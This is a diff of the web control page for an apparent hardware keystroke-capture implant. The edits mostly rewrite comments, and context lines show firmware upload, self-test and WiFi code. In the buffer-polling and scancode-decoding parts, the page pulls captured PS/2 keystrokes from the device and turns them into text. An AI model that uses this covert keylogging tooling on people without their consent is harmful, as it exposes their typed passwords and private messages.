@@ -55,13 +55,12 @@
             color:#fff;font-size:.95rem;font-weight:650;cursor:pointer}
         button:disabled{opacity:.5}
         .copyrow{display:flex;justify-content:flex-end;margin-top:8px}
-        /* A panel that has produced nothing yet hides its own copy button rather than
-           leaving one floating under an empty box. Textareas are deliberately left out:
-           their text lives in .value, so :empty is true even when they hold a capture. */
+        /* These panels hide their copy button while empty. Textareas are left out: their
+           text lives in .value, so :empty matches them even when they hold a capture. */
         #buildinfo:empty+.copyrow,#wifiNow:empty+.copyrow,#wsResult:empty+.copyrow,
         #stRows:empty+.copyrow{display:none}
-        /* Kept in its own rule: a browser without :has drops the whole selector list it
-           appears in, which would take the plain :empty rules above down with it. */
+        /* A rule of its own: a browser without :has drops the whole selector list it is
+           in, and would drop the plain :empty rules above with it. */
         .scroll:has(#benchTable:empty)+.copyrow{display:none}
         button.copy{width:auto;min-width:0;min-height:34px;padding:7px 14px;font-size:.79rem;font-weight:650;
             background:var(--field);color:var(--muted);border:1px solid var(--line)}
@@ -449,13 +448,11 @@
         </main>
     </div>
     <script>
-        // Loaded before the page logic so it can report a failure inside it. A parse
-        // error in that script kills all of it at once, and because the HTML is
-        // static the page still renders: every panel stays empty, every button is
-        // dead, and nothing anywhere says why. That shipped once and took a firmware
-        // flash to find. webgen.js is what prevents it now; this block is what makes
-        // it audible if one ever gets through, because no try/catch inside a script
-        // can catch the error that stopped that script from existing.
+        // Loaded before the page logic so it can report a failure in it. A parse error
+        // kills that whole script, and the static HTML still renders: every panel stays
+        // empty, every button is dead, and nothing says why. webgen.js refuses to emit
+        // such a page; this block reports one that gets through, because no try/catch
+        // inside a script can catch the parse error of that same script.
         (function () {
             var seen = {};
 
@@ -508,8 +505,8 @@
                 fault('UNHANDLED PROMISE', (reason && (reason.message || reason)) || 'unknown');
             });
 
-            // The page logic sets this on its last line. Absent once the document has
-            // loaded, the script never reached the end, so nothing was wired up.
+            // The page logic sets okhiMainLoaded on its last line, so if it is still
+            // unset at load, that script stopped before its end.
             window.addEventListener('load', function () {
                 if (window.okhiMainLoaded) {
                     return;
@@ -520,8 +517,8 @@
                     + ' whose script cannot parse.');
             });
 
-            // Start up one step at a time, so a single failure cannot take the rest
-            // of the page with it the way a flat sequence of calls does.
+            // Each init step runs in its own try/catch, so one that throws does not
+            // stop the steps after it. okhiEvery and okhiAfter do the same for timers.
             window.okhiStep = function (name, run) {
                 try {
                     run();
@@ -552,23 +549,19 @@
         })();
     </script>
     <script>
-        // Replaced by webgen.js when the page is generated. The token surviving
-        // into a served page means it was never generated at all, which is
-        // worth knowing on its own, so the display says so rather than hiding it.
+        // webgen.js replaces the token when it generates the page, so a served page that
+        // still holds it never went through webgen.js. webgen.js and make_release.py find
+        // the stamp with a regex on this line as written: keep its quotes and spacing.
         const WEBGEN_STAMP = '@@WEBGEN@@';
-        // The stamp is baked into the page, so it can be shown the moment the
-        // page loads and stays up with no device to answer /versions. A page
-        // still carrying the raw token was served straight from the editor, so
-        // the firmware was built around an index.html nobody ran webgen.js over.
         function webStampLine() {
             return 'WEB  ' + (WEBGEN_STAMP.indexOf('@@') === 0
                 ? 'NOT GENERATED, run webgen.js and rebuild the ESP'
                 : WEBGEN_STAMP);
         }
-        // One fingerprint over the three identities (esp image sha, rp identity, web stamp), so a
-        // single 16 hex value says unambiguously which combination is flashed. make_release.py
-        // writes the same value into the release manifest with the identical FNV-1a 64-bit over
-        // "espHex|rpIdentity|webStamp" (all ASCII), so the page and the manifest can be compared.
+        // FNV-1a 64 over "espHex|rpIdentity|webStamp", so one 16 hex digit value names the flashed
+        // combination. make_release.py writes the same hash into the release manifest: its
+        // fnv1a64() hashes UTF-8 bytes and this loop the low byte of each char, the same bytes
+        // while all three parts are ASCII.
         function releaseFingerprint(espHex, rpIdentity, webStamp) {
             const combo = espHex + '|' + rpIdentity + '|' + webStamp;
             let h = 0xcbf29ce484222325n;
@@ -580,11 +573,10 @@
             }
             return h.toString(16).padStart(16, '0');
         }
-        // Copy buttons. The implant is served over plain http on a LAN address, which is NOT a
-        // secure context, so navigator.clipboard is undefined on the device even though it works
-        // when the page is opened from a file. The hidden textarea plus execCommand path is the
-        // one that actually runs here, and if even that is refused the source is left selected so
-        // ctrl+C still works rather than the click doing nothing.
+        // Copy buttons. The device serves the page over plain http on a LAN address, which is not
+        // a secure context, so navigator.clipboard is undefined there (it exists when the page is
+        // opened from a file). The copy then goes through a hidden textarea and execCommand, and if
+        // that is refused too, a textarea source is left selected for ctrl+C.
         function okhiCopyPayload(el) {
             if (!el) {
                 return '';
@@ -641,8 +633,8 @@
                 btn.classList.remove('failed');
             }, 1400);
         }
-        // One delegated listener rather than one per button, so panels that build their content
-        // later (the self test rows, the benchmark table) need no extra wiring.
+        // One delegated listener for every button.copy, reading the text at click time, so panels
+        // that fill in later (the self test rows, the benchmark table) need no wiring of their own.
         function okhiInstallCopyButtons() {
             document.addEventListener('click', function (ev) {
                 const btn = (ev.target && ev.target.closest) ? ev.target.closest('button.copy') : null;
@@ -660,7 +652,7 @@
                         try {
                             src.select();
                         } catch (e) {
-                            // A pre cannot be selected this way, the message still says what to do.
+                            // If select() throws, the button still asks for ctrl+C.
                         }
                     }
                     okhiCopyFlash(btn, ok ? 'Copied' : 'Press ctrl+C', ok ? 'done' : 'failed');
@@ -676,12 +668,11 @@
                 settle(okhiCopyFallback(text));
             });
         }
-        // Four things here take exclusive control of the device: an upload
-        // writes flash and reboots, a benchmark reprograms the clock tree, a
-        // self test drives pins the drivers own, and saving the network
-        // reboots. Starting any on top of another corrupts whichever was
-        // already running, so they all ask here first, and they say why rather
-        // than ignoring the click.
+        // busyReason() names the run in progress, if any: an upload (writes flash and
+        // reboots), a benchmark (reprograms the clock tree), a self test (drives pins
+        // the drivers own), a reset or a WiFi speed test. Starting anything on top of a
+        // run breaks it, so every button that starts one, and the network save and
+        // BOOTSEL buttons, asks here first and says why it refuses the click.
         let rpResetInProgress = false;
         function busyReason() {
             if (otaInProgress) return 'a firmware upload is in progress';
@@ -702,10 +693,10 @@
             el.textContent = text;
             el.style.color = color;
         }
-        // The reset reboots the RP, which pulls the ESP's CHIP_PU low, so THIS
-        // page's device reboots too and the socket drops. The click is confirmed
-        // not by the reply (which may never arrive) but by reset_times climbing
-        // once the board is back, which is the whole point of the counter.
+        // The reset reboots the RP, which pulls the ESP's CHIP_PU low, so the ESP
+        // serving this page reboots too and the connection drops. The reply may never
+        // arrive, so the page confirms the reset by reset_times going up once the
+        // board is back.
         function waitForReset(before, tries) {
             if (tries > 40) {
                 setRpResetStatus('The board did not come back in time. Reload the page by hand.', '#e74c3c');
@@ -769,9 +760,9 @@
                 setBootselStatus('Request did not reach the device, try again.', '#e74c3c');
             });
         });
-        // CRC32 with the same polynomial the firmware uses, so both ends agree on what
-        // arriving intact means. Random payloads plus a checksum on every block are what
-        // keep the number honest: shifting bytes nobody verified is not throughput.
+        // The firmware's CRC32 (crc32_update() in com_esp.h: reflected 0xEDB88320, init and final
+        // XOR 0xFFFFFFFF). Every block is random data checked against its CRC at the far end, so
+        // a block that arrives wrong fails the test. Its bytes still count in the rate.
         let wsCrcTable = null;
         function wsCrc32(buf) {
             if (!wsCrcTable) {
@@ -786,8 +777,8 @@
             for (let i = 0; i < buf.length; i++) { crc = wsCrcTable[(crc ^ buf[i]) & 0xFF] ^ (crc >>> 8); }
             return (crc ^ 0xFFFFFFFF) >>> 0;
         }
-        // Read at the moment each leg starts, so the choice applies to this run and the
-        // longer settings measure a sustained link rather than a lucky burst.
+        // Read as each direction starts, so the setting chosen at that moment applies. The
+        // longer settings measure a sustained link instead of a short burst.
         function wsMs() {
             const v = parseInt(document.getElementById('wsTime').value, 10);
             return (v > 0) ? v : 30000;
@@ -873,10 +864,9 @@
             const n = parseInt(v, 10);
             return Number.isFinite(n) ? n : dflt;
         }
-        // Every paged endpoint answers with more=N meaning "call again from N".
-        // A device that answered with the same or a lower N would spin this
-        // forever and never settle the promise, leaving the caller's button
-        // dead, so the follow up must strictly advance and is depth capped.
+        // Every paged endpoint answers with more=N, meaning "call again from N". A device
+        // that answered with the same or a lower N would loop forever and never settle the
+        // promise, leaving the caller's button dead, so N must be above from and below 4096.
         function pageNext(info, from) {
             const next = numOr(info.more, -1);
             return next > from && next < 4096 ? next : -1;
@@ -933,9 +923,9 @@
                     }
                     const text = await r.text();
                     if (text.length === 0) {
-                        // Either the real end of the log, or a transient read hiccup on the device.
-                        // Retry the same offset a few times before giving up, so one bad read never
-                        // truncates the download while reporting success.
+                        // The end of the log, or a failed read on the device. Below the total,
+                        // retry the same offset up to 5 times, 120 ms apart, so one bad read does
+                        // not cut the download short while it reports success.
                         if (from < total && stalls < 5) {
                             stalls++;
                             await sleep(120);
@@ -1038,11 +1028,11 @@
                 el.style.color = color;
             }
         }
-        // The variant tag of the packages this firmware accepts. A package for the other variant
-        // IS refused by the device, but it is refused after reading only the 32 byte header, while
-        // the browser is still sending the remaining ~900 KB, so the reply is lost in the reset and
-        // all the user sees is a dropped connection. Checking the header here turns that into an
-        // instant, explicit message and uploads nothing.
+        // The variant tag of the packages this firmware accepts. The device refuses a package for
+        // the other variant after its 32 byte header, while the browser is still sending the
+        // remaining ~900 KB, so the reply is lost in the connection reset and the user sees only
+        // a dropped connection. Checking the header here gives a clear message at once and
+        // uploads nothing.
         const OKHI_PKG_VARIANT = 'PS2';
         // Returns an error string when the file must not be sent, or '' when it is fine. A file
         // that is not an okhi package is allowed through: /ota also takes a raw ESP image.
@@ -1069,9 +1059,9 @@
             setOtaStatus('Uploading 0% - do not power off', '#3498db');
             const request = new XMLHttpRequest();
             request.open('POST', '/ota', true);
-            // Without this a device that accepts the body and never replies
-            // leaves otaInProgress true, and that flag suppresses every capture
-            // poll on the page until the OS gives up on the socket.
+            // Without a timeout, a device that takes the body and never replies leaves
+            // otaInProgress true, and that flag stops every capture poll on the page
+            // until the OS gives up on the socket.
             request.timeout = 180000;
             request.ontimeout = function() {
                 otaInProgress = false;
@@ -1120,9 +1110,9 @@
             otaInProgress = true;
             button.disabled = true;
             setOtaStatus('Checking the package...', '#3498db');
-            // Read just the header before committing to the upload. If the slice cannot be read
-            // the upload still goes ahead: the device validates the package itself, this check
-            // only exists to give a better message for the one case whose reply never arrives.
+            // Read the 32 byte header first. If the slice cannot be read the upload goes ahead
+            // anyway: the device validates the package itself, and this check only gives a clear
+            // message for the one case whose reply never arrives.
             file.slice(0, 32).arrayBuffer().then(function(buf) {
                 const problem = okhiPackageProblem(buf);
                 if (problem) {
@@ -1245,9 +1235,8 @@
                 '</th><th>KB/s</th><th>verdict</th></tr>';
             const failures = [];
             steps.forEach(function(s) {
-                // A row shorter than the format would put undefined into the
-                // markup and, on the confirmation row, throw out of the whole
-                // render and turn the poll into a permanent error loop.
+                // A row shorter than the 14 fields of the format would put
+                // undefined into the table.
                 if (s.length < 14 || !Number.isFinite(s[0])) {
                     return;
                 }
@@ -1321,8 +1310,9 @@
             info.soakStep = soakStep;
             return info;
         }
-        // Forty rows do not fit in one reply, so the device pages them and says
-        // where to carry on. Everything is merged before anything is drawn.
+        // The device sends at most SPI_BENCH_ROWS_PER_REPLY (12) of the up to 40 step
+        // rows per reply, with more=N for the rest. Every page is merged before anything
+        // is drawn.
         function benchFetch(from, rows) {
             const url = from ? '/spibench?from=' + from : '/spibench';
             return fetch(url, { cache: 'no-store' })
@@ -1333,18 +1323,16 @@
                     if (next >= 0) {
                         return benchFetch(next, info.rows);
                     }
-                    // A more= that does not advance is a device bug, not
-                    // something to chase. The table simply misses this tick and
-                    // the next poll tries again, which beats spinning forever.
+                    // A more= that does not advance is a device bug: this tick
+                    // draws nothing and the next poll tries again.
                     return info;
                 });
         }
         function benchStop() {
             benchInProgress = false;
-            // Bumping the token orphans any poll already in flight. clearTimeout
-            // cannot reach a fetch that has already left, and without this the
-            // stale reply reschedules itself and a poll loop keeps running with
-            // nobody owning it.
+            // Bumping the token orphans a poll already in flight: clearTimeout cannot
+            // stop a fetch that has left, and its stale reply would start a poll loop
+            // that nobody owns.
             benchToken++;
             benchMisses = 0;
             clearTimeout(benchTimer);
@@ -1466,8 +1454,8 @@
                     setBenchStatus('Could not reach the device: ' + error, '#e74c3c');
                 });
         });
-        // The two links measure different quantities, so the pickers are rebuilt
-        // rather than reinterpreted: kHz of SPI clock on one, baud on the other.
+        // The pickers are rebuilt when the link changes: their values are kHz of SPI
+        // clock for SPI and baud for UART.
         const BENCH_RANGE = {
             0: {
                 min: [[500, '0.5 MHz'], [1000, '1 MHz'], [2000, '2 MHz'], [4000, '4 MHz']],
@@ -1502,8 +1490,8 @@
         }
         benchEl('benchKind').addEventListener('change', benchKindChanged);
         benchKindChanged();
-        // A run outlives the page: a three hour confirmation keeps going if the tab
-        // is closed, so a fresh load has to notice one is still in flight.
+        // A run outlives the page (a confirmation can last 3 h), so a fresh load
+        // reattaches to a run that is still armed or running.
         function benchResume() {
             benchFetch(0, [])
                 .then(info => {
@@ -1520,7 +1508,7 @@
         let stBlinked = {};
         const ST_STATUS = ['PASS', 'FAIL', 'WARN', 'SKIP', 'INFO', 'ASK'];
         const ST_CLASS = ['pass', 'fail', 'fail', '', '', ''];
-        // id -> what it is, and where to look on the board when it fails
+        // Test id: its name, and where to look on the board when it fails.
         const ST_NAME = {
             0x01: ['RP firmware', ''],
             0x02: ['Hardware straps', 'GPIO4 and GPIO5, the version resistors'],
@@ -1601,9 +1589,9 @@
             info.rows.forEach(function(r) {
                 const known = ST_NAME[r.id] || ['test 0x' + r.id.toString(16), ''];
                 const bad = r.status === 1;
-                // r.text comes from the device. The firmware strips commas so
-                // the row parses, but not angle brackets, so one message worded
-                // with an arrow would swallow the rest of the list into a tag.
+                // r.text comes from the device. The firmware turns commas into
+                // spaces but keeps angle brackets, so unescaped, one message with
+                // an arrow in it would swallow the rest of the list into a tag.
                 html += '<div class="st"><b class="' + (ST_CLASS[r.status] || '') + '">' +
                     (ST_STATUS[r.status] || '?') + '</b><span>' + escHtml(known[0]) +
                     '<i>' + escHtml(r.text) + (bad && known[1] ? ' &mdash; check ' + escHtml(known[1]) : '') +
@@ -1612,8 +1600,8 @@
             stEl('stRows').innerHTML = html;
         }
         function stAskBlock(info) {
-            // The two LEDs are the only things on this board no amount of firmware
-            // can check, so they are asked rather than guessed at.
+            // The two LEDs are the only parts of the board the firmware cannot check,
+            // so the page asks the user whether each one blinks.
             const answered = {};
             info.rows.forEach(function(r) {
                 if ((r.id === 0x14 || r.id === 0x8A) && r.status !== 5) {
@@ -1640,27 +1628,25 @@
                     fetch(url, { cache: 'no-store' }).then(() => stPoll()).catch(() => {});
                 });
             });
-            // pending is rebuilt from fresh literals on every render, so a
-            // latch stored on it never survives. Keyed outside, it does, and the
-            // LED stops restarting its pattern every time the table redraws.
+            // The blink latch lives in stBlinked because pending is rebuilt on
+            // every render. Without it each redraw would restart the LED pattern.
             if (!stBlinked[q[1]]) {
                 stBlinked[q[1]] = true;
                 fetch('/selftest?blink=' + q[1], { cache: 'no-store' }).catch(() => {});
             }
         }
-        // The USB switch is the one part a purely electrical sweep cannot fully prove: with
-        // nothing attached, both sides of it read the same. Grounding one line at a time with
-        // a dupont wire settles it, and doing them one at a time is what catches a bridge
-        // between the two neighbouring pins, since the other line has to stay up.
+        // The electrical sweep cannot fully prove the USB switch: with nothing attached, both
+        // sides of it read the same. The user grounds one sniff line at a time with a dupont
+        // wire, and the other line has to stay up, which catches a bridge between the two
+        // neighbouring pins.
         let stProbePending = 0;
         let stProbeWaitedMs = 0;
         function stSwProbeBlock(info) {
             const done = {};
             info.rows.forEach(function(r) {
-                // status 4 is the in progress marker the ESP writes the moment it accepts
-                // the request. Counting it as a result is what made the page show the
-                // previous wire's verdict: the reply is most of a second away, and the old
-                // row is indistinguishable from a new one while it is still sitting there.
+                // Status 4 (INFO) is the in progress row the ESP writes over the line's last
+                // verdict when it accepts the request. It is not a result: the RP answers most
+                // of a second later.
                 if ((r.id === 0x16 || r.id === 0x17) && r.status !== 4) { done[r.id] = r; }
             });
             if (stProbePending && done[stProbePending === 1 ? 0x16 : 0x17]) { stProbePending = 0; }
@@ -1690,13 +1676,10 @@
                     const which = parseInt(b.getAttribute('data-probe'), 10);
                     stProbePending = which;
                     b.disabled = true;
-                    // The RP answers around 600 ms later and the old code polled once at
-                    // exactly 600, so it usually read the table one beat too early. Poll
-                    // until the verdict actually lands instead of guessing the latency.
-                    // fetch only rejects on a network failure, so a 409 (a probe already
-                    // pending) or a 400 arrived here as success and the page sat waiting for
-                    // a verdict that was never coming, with the button disabled for good.
-                    // Check the status, and put the button back in every failing path.
+                    // The RP answers about 600 ms later, and stPoll() keeps polling until the
+                    // verdict lands. fetch rejects only on a network failure: a 409 (a probe
+                    // already pending, or no RP) or a 400 resolves, so check r.ok and give the
+                    // button back on every failing path.
                     fetch('/selftest?swprobe=' + which, { cache: 'no-store' })
                         .then(function(r) {
                             if (!r.ok) {
@@ -1762,10 +1745,9 @@
                         stTimer = setTimeout(stPoll, 700);
                         return;
                     }
-                    // A switch probe leaves the run idle, so without this the page stopped
-                    // asking after a single try and kept whatever the table held. The ESP
-                    // gives up on its own after ST_PROBE_TIMEOUT_MS and writes a verdict,
-                    // so this cannot spin forever.
+                    // A switch probe leaves the run state idle, so keep polling every 250 ms
+                    // while one is pending, for about 12 s. The ESP gives up on its own after
+                    // ST_PROBE_TIMEOUT_MS (10 s) and writes a verdict.
                     if (stProbePending) {
                         stProbeWaitedMs += 250;
                         if (stProbeWaitedMs < 12000) {
@@ -1783,8 +1765,8 @@
                     if (mine !== stToken) {
                         return;
                     }
-                    // Without a cap this polls a dead device for the life of the
-                    // tab with the button disabled and nothing said about it.
+                    // Give up at the 21st failed poll in a row, or a dead device keeps
+                    // the button disabled for the life of the tab with no message.
                     if (++stMisses > 20) {
                         stBusy = false;
                         stEl('stButton').disabled = false;
@@ -1872,8 +1854,8 @@
         document.getElementById('wifiSsid').addEventListener('input', function() {
             this.dataset.touched = '1';
         });
-        // Without this the 15 s refresh silently reverts the mode the moment
-        // focus moves to the name field, and Save then writes the old mode.
+        // Without this, the first 15 s refresh after focus leaves the picker puts
+        // the stored mode back, and Save then writes the old mode.
         document.getElementById('wifiMode').addEventListener('change', function() {
             this.dataset.touched = '1';
         });
@@ -1886,8 +1868,8 @@
             if (button.disabled) {
                 return;
             }
-            // This reboots the device about a second later. Doing that during an
-            // upload cuts the write off half way through.
+            // Saving reboots the device about a second later, which would cut an
+            // upload off half way through.
             const busy = busyReason();
             if (busy) {
                 el.textContent = 'Not now: ' + busy + '. Saving reboots the device.';
@@ -1907,14 +1889,10 @@
             el.textContent = 'Saving...';
             el.style.color = '#3498db';
             button.disabled = true;
-            // An ABSENT pass keeps whatever is stored, an empty one clears it.
-            // The field is never pre-filled, so sending it blank every time
-            // would destroy the credential of anyone who only changed the mode.
-            // An absent pass= means "keep the stored one", which is what a blank field has to
-            // mean or changing only the mode would wipe the credential. That left no way at
-            // all to say "this network has no password", so an open network could never be
-            // joined even though the firmware handles one fine. The checkbox sends an
-            // explicitly EMPTY pass=, which is a different thing from omitting it.
+            // An absent pass= keeps the stored password and an empty one clears it. The
+            // field is never pre-filled, so a blank field sends no pass=, or changing only
+            // the mode would wipe the password. The open network checkbox sends an empty
+            // pass=, the only way to say the network has no password.
             const openNet = document.getElementById('wifiOpen').checked;
             const q = '/wifi?save=1&mode=' + mode + '&ssid=' + encodeURIComponent(ssid) +
                 (openNet ? '&pass=' : (pass === '' ? '' : '&pass=' + encodeURIComponent(pass)));
@@ -1956,8 +1934,8 @@
                     }
                     const espHex = (v.esp_image || '').replace(/^sha\s+/, '');
                     // The sha is the per compilation identity and the one the release manifest
-                    // lists; esp_build is the app_desc date, which does not move on an incremental
-                    // ESP-IDF build, so it cannot tell two builds apart on its own.
+                    // lists. esp_build is the app_desc date and time, which do not move on an
+                    // incremental ESP-IDF build, so it cannot tell two builds apart on its own.
                     const espLine = 'ESP  v' + (v.esp_version || '?') + '  sha ' + (espHex || '?') +
                         '  ' + (v.esp_build || '?') +
                         '  [' + (v.esp_variant || '?') + ', ' + (v.esp_partition || '?') +
@@ -2077,10 +2055,10 @@
                 el.style.color = '#2ecc71';
             }
         }
-        // The page is meant to be left open for hours, and a three hour soak is
-        // an offered option, so nothing here may grow without a ceiling. The two
-        // debug boxes PREPEND, which rebuilds the whole string every poll and
-        // costs the square of the session length if it is never trimmed.
+        // The page can stay open for hours (a confirmation can last 3 h), so each box
+        // keeps at most AREA_LIMIT characters. The two debug boxes prepend, which
+        // rebuilds the whole string on every poll: untrimmed, the cost grows with the
+        // square of the session length.
         const AREA_LIMIT = 400000;
         function areaAppend(el, text, prepend) {
             const merged = prepend ? text + '\n' + el.value : el.value + text;
@@ -2098,9 +2076,9 @@
                 areaAppend(document.getElementById('KEYS'), parsed, false);
             }
         }
-        // Crystal calibration (firmware/com/com_rp_clock.h). The implant leaves keystroke capture for a
-        // clock mode and stays there until it is stopped here or its power is cut. /buffer reports the
-        // mode in X-Okhi-Clock, so /clock is only polled while a mode runs.
+        // Crystal calibration (firmware/com/com_rp_clock.h). The implant leaves keystroke capture
+        // for a clock mode and stays there until it is stopped here or its power is cut. /buffer
+        // reports the mode in X-Okhi-Clock, so /clock is only polled while a mode runs.
         var clockMode = 'off';
         var clockNext = 0;
         var clockBusy = false;
@@ -2213,30 +2191,28 @@
                         if (lost > 0) {
                             bufferDropped += lost;
                             // Bytes are missing, so the make/break and E0/F0 state
-                            // machine can no longer be trusted. Start clean.
+                            // of the decoder is stale. Start clean.
                             resetKeyDecoder();
                         }
                     }
                     bufferFirstPoll = false;
                     showLinkStatus(numOr(head, 0), true);
                     showClockMode(response.headers.get('X-Okhi-Clock'));
-                    // A missing or unparsable cursor would leave bufferCursor
-                    // where it was and replay the same records into KEYS every
-                    // poll, forever. Stopping is the only safe reading of it.
+                    // Without a valid X-Okhi-Next the cursor would stay put and the
+                    // same records would replay into KEYS on every poll, so stop.
                     const nextCursor = numOr(next, -1);
                     if (nextCursor < 0) {
                         break;
                     }
                     if (response.status !== 200) {
-                        // No body to lose on this one, so it is safe to step over it.
+                        // A 204 carries no records, so moving the cursor loses nothing.
                         bufferCursor = nextCursor;
                         break;
                     }
-                    // Read the body BEFORE stepping the cursor. Advancing first meant that a
-                    // reply cut short by a dropped connection took its records with it: the
-                    // cursor had already moved past them, so the next poll asked for what came
-                    // after and those keystrokes were gone for good, with nothing on screen to
-                    // say so. Repeating a block is harmless next to losing one.
+                    // Read the body before moving the cursor. When a dropped connection cuts the
+                    // reply short, text() throws, the cursor stays and the next poll asks for the
+                    // same records again; moving it first would lose them with nothing on screen
+                    // to say so.
                     const body = String(await response.text());
                     bufferCursor = nextCursor;
                     appendBufferData(body);
@@ -2251,9 +2227,9 @@
                 bufferBusy = false;
             }
         }
-        // PS/2 set 2 scancodes are physical key positions, not characters: the layout is
-        // what turns a position into a character, which is exactly what differs between
-        // english and spanish. Letters and layout independent keys are their own tables.
+        // PS/2 set 2 scancodes are physical key positions, not characters: the layout turns
+        // a position into a character, and that is what differs between english and spanish.
+        // Letters and the layout independent keys have tables of their own.
         var PS2_LETTERS = {
             '0x1C': 'a', '0x32': 'b', '0x21': 'c', '0x23': 'd', '0x24': 'e', '0x2B': 'f',
             '0x34': 'g', '0x33': 'h', '0x43': 'i', '0x3B': 'j', '0x42': 'k', '0x4B': 'l',
@@ -2261,8 +2237,8 @@
             '0x1B': 's', '0x2C': 't', '0x3C': 'u', '0x2A': 'v', '0x1D': 'w', '0x22': 'x',
             '0x35': 'y', '0x1A': 'z'
         };
-        // Modifiers are not in these tables on purpose: they are tracked as state and
-        // folded into the character, so they can never be emitted as a stray token.
+        // Modifiers are not in these tables: applyModifier() tracks them as state, and they
+        // reach the output only through the character or its [CTRL]/[ALT]/[GUI] prefix.
         var PS2_NAMES = {
             '0x66': '[BKSP]', '0x29': '[SPACE]', '0x0D': '[TAB]', '0x58': '[CAPS]',
             '0x5A': '[ENTER]', '0x76': '[ESC]', '0x77': '[NUM]', '0x7E': '[SCROLL]',
@@ -2363,7 +2339,6 @@
                     this.releaseNext = true;
                     return '';
                 }
-                // Replies to host commands travel on the same wire as scancodes.
                 if (PS2_IGNORED[code]) {
                     return '';
                 }
@@ -2493,8 +2468,8 @@
             okhiEvery('rp stats', fetchRp, 3400);
         });
 
-        // Reached only when everything above it parsed. The guard block at the top
-        // of the page watches for this and shouts when it is missing.
+        // Reached only when the whole script parsed and ran to here. The guard script
+        // at the top of the page checks for it on load and reports when it is missing.
         window.okhiMainLoaded = true;
     </script>
 </body>
